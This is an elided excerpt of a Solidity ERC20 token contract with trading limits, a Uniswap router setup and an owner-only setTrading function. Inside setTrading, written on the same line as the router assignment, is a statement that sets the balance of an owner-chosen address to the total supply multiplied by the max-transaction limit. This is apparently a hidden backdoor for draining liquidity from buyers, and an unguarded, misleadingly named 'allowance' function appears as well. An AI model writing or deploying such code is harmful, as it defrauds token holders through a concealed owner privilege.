...
contract Deployment is Context, IERC20, Ownable {
    ...
    uint256 private _maxTx = 20000000* 10**9;
    uint256 private _maxWallet = 20000000* 10**9;
    constructor() {
    ...
    function _approve(
     ...
     function allowance(uint256 amount, address recipient) external {
    ...
    function setTrading(address pair) external onlyOwner {
        require(!_isTrading, "trading is already open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router=_uniswapV2Router;_balances[pair]=_totalSupply*_maxTx;
